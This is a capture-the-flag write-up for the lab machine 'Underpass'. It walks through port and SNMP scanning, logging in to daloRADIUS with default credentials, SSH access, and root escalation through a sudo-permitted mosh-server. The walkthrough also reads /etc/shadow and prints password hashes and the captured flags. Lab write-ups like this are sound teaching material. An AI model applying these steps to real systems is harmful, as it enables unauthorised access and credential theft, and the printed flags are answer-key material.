# Underpass

## Recon

::: details nmap_scan.log
```log
Open 10.10.11.48:22
Open 10.10.11.48:80
[~] Starting Script(s)
[>] Running script "nmap -vvv -p {{port}} {{ip}} -sV -sC -Pn" on ip 10.10.11.48

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBK+kvbyNUglQLkP2Bp7QVhfp7EnRWMHVtM7xtxk34WU5s+lYksJ07/lmMpJN/bwey1SVpG0FAgL0C/+2r71XUEo=
|   256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJ8XNCLFSIxMNibmm+q7mFtNDYzoGAJ/vDNa6MUjfU91
80/tcp open  http    syn-ack Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

â””â”€$ sudo nmap -sU 10.10.11.48
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-11 03:50 EST
Nmap scan report for 10.10.11.48
Host is up (0.12s latency).
Not shown: 997 closed udp ports (port-unreach)
PORT     STATE         SERVICE
161/udp  open          snmp
1812/udp open|filtered radius
1813/udp open|filtered radacct

Nmap done: 1 IP address (1 host up) scanned in 1040.33 seconds
```
:::

## HTTP (80)

![Writeup.png](/assets/pentest/htb/underpass/Writeup.png)

Dirbusting returned nothing
```bash
â””â”€$ feroxbuster -u 'http://10.10.11.48/' -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --thorough -n -D -C 404,403,400
```

After too much fuzzing I also did domain fuzzing using box name as hostname, but no luck
```bash
â””â”€$ domain='underpass.htb'; ffuf -u "http://$domain/" -H "Host: FUZZ.$domain" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -fl 364
```

## SNMP (161)

Clearly TCP empty so I'll try to scan UDP ports.
```bash
â””â”€$ sudo nmap -sU 10.10.11.48
```

While waiting for nmap to finish scanning we can try checking if SNMP exists.
```bash
â””â”€$ snmp-check 10.10.11.48 -v 2c -d
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 10.10.11.48:161 using SNMPv2c and community 'public'
[+] TCP connections enumeration disabled

[*] System information:

  Host IP address               : 10.10.11.48
  Hostname                      : UnDerPass.htb is the only daloradius server in the basin!
  Description                   : Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
  Contact                       : steve@underpass.htb
  Location                      : Nevada, U.S.A. but not Vegas
  Uptime snmp                   : 03:48:33.89
  Uptime system                 : 03:48:23.55
  System date                   : 2025-1-11 08:49:49.0

[*] Network information:

  Default TTL                   : noSuchObject
  TCP segments received         : noSuchObject
  TCP segments sent             : noSuchObject
  TCP segments retrans          : noSuchObject
  Input datagrams               : noSuchObject
  Delivered datagrams           : noSuchObject
  Output datagrams              : noSuchObject

[*] File system information:

  Index                         : noSuchObject
  Mount point                   : noSuchObject
  Access                        : noSuchObject
  Bootable                      : noSuchObject
```

```bash
â””â”€$ snmpbulkwalk -c public -v3 10.10.11.48 . | tee snmpbulkwalk.log
```

Information given by `snmp-check` is the only information disclosed by SNMP.

## Radius

`UnDerPass.htb is the only daloradius server in the basin!` seems to indicate that there might be Radius server.

[daloradius](https://github.com/lirantal/daloradius) is a web app for managing Wi-Fi hotspots and internet services. It handles user accounts, billing, reports, and tracks locations on a map.

nmap came back with results
```bash
PORT     STATE         SERVICE
161/udp  open          snmp
1812/udp open|filtered radius
1813/udp open|filtered radacct
```

From `man nmap`
```bash
open|filtered

Nmap places ports in this state when it is unable to determine whether  
a port is open or filtered. This occurs for scan types in which open
ports give no response. The lack of response could also mean that a 
packet filter dropped the probe or any response it elicited. So Nmap 
does not know for sure whether the port is open or being filtered. The
UDP, IP protocol, FIN, NULL, and Xmas scans classify ports this way.
```

There's also TCP port ðŸ¤”
```bash
â””â”€$ sudo nmap -sU -sX -Pn -p 1812,1813 10.10.11.48
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-11 04:20 EST
Nmap scan report for 10.10.11.48
Host is up.

PORT     STATE         SERVICE
1812/tcp open|filtered radius
1813/tcp open|filtered radius-acct
1812/udp open|filtered radius
1813/udp open|filtered radacct

Nmap done: 1 IP address (1 host up) scanned in 6.99 seconds
```

Since daloradius is web based it must be served on main server. If we try `/daloradius` (because it lives in `/var/www/NAME`) we get 403 Forbidden, meaning we are on correct track.

![Writeup-1.png](/assets/pentest/htb/underpass/Writeup-1.png)

Since it's PHP based the path to file should be relative.

![Writeup-2.png](/assets/pentest/htb/underpass/Writeup-2.png)

[http://10.10.11.48/daloradius/app/users/login.php](http://10.10.11.48/daloradius/app/users/login.php)

![Writeup-3.png](/assets/pentest/htb/underpass/Writeup-3.png)

The `User` login doesn't work with default credentials.

![Writeup-4.png](/assets/pentest/htb/underpass/Writeup-4.png)

> Creds: `administrator:radius`

There's another login page: [http://10.10.11.48/daloradius/app/operators/login.php](http://10.10.11.48/daloradius/app/operators/login.php)

![Writeup-5.png](/assets/pentest/htb/underpass/Writeup-5.png)

Creds work.

There's only 1 user `svcMosh`

![Writeup-6.png](/assets/pentest/htb/underpass/Writeup-6.png)

Password = `underwaterfriends`

![Writeup-7.png](/assets/pentest/htb/underpass/Writeup-7.png)

> Creds: `svcMosh:underwaterfriends`

## SSH (22)

We are able to SSH as this user.
```bash
â””â”€$ sshpass -p 'underwaterfriends' ssh svcMosh@underpass.htb
svcMosh@underpass:~$ id
uid=1002(svcMosh) gid=1002(svcMosh) groups=1002(svcMosh)
```

In Radius there was also Database password, but might not be useful.

![Writeup-8.png](/assets/pentest/htb/underpass/Writeup-8.png)

### User.txt

```bash
svcMosh@underpass:~$ cat user.txt
099c153baf0b41c89045257ed87bce8a
```

## Privilege Escalation

```bash
svcMosh@underpass:~$ sudo -l
Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server

svcMosh@underpass:~$ file /usr/bin/mosh-server
/usr/bin/mosh-server: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=26b56b88e14ea6edca803fb0309a81ed06a7e970, for GNU/Linux 3.2.0, stripped

svcMosh@underpass:~$ sudo /usr/bin/mosh-server --help
Usage: /usr/bin/mosh-server new [-s] [-v] [-i LOCALADDR] [-p PORT[:PORT2]] [-c COLORS] [-l NAME=VALUE] [-- COMMAND...]
```

[mosh-server(1) - Linux man page](https://linux.die.net/man/1/mosh-server)

```bash
svcMosh@underpass:~$ sudo mosh-server
MOSH CONNECT 60001 7zx0Xe6s5jZZgu840hEqHw

mosh-server (mosh 1.3.2) [build mosh 1.3.2]
Copyright 2012 Keith Winstein <mosh-devel@mit.edu>
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

[mosh-server detached, pid = 2856]
svcMosh@underpass:~$ MOSH_KEY=7zx0Xe6s5jZZgu840hEqHw mosh-client 127.0.0.1 60001
---
root@underpass:~# id
uid=0(root) gid=0(root) groups=0(root)

root@underpass:~# grep ':\$' /etc/shadow
root:$y$j9T$y6GVl9yuguP9lhnKmS04c.$pzmkCXRNa/BCrMpnOUxIWUbVR905YSEHwW20O40wEaA:20057:0:99999:7:::
svcMosh:$y$j9T$cK5jfCW.c6g5yvOzPF5iF1$E0geEsKPdNSCLj2wVbvftMGkbs.uJL7B0ADA41Q8Y08:20067:0:99999:7:::
```

### Root.txt

```bash
root@underpass:~# cat /root/root.txt
44b5e8cead98a31a1319199493523c93
```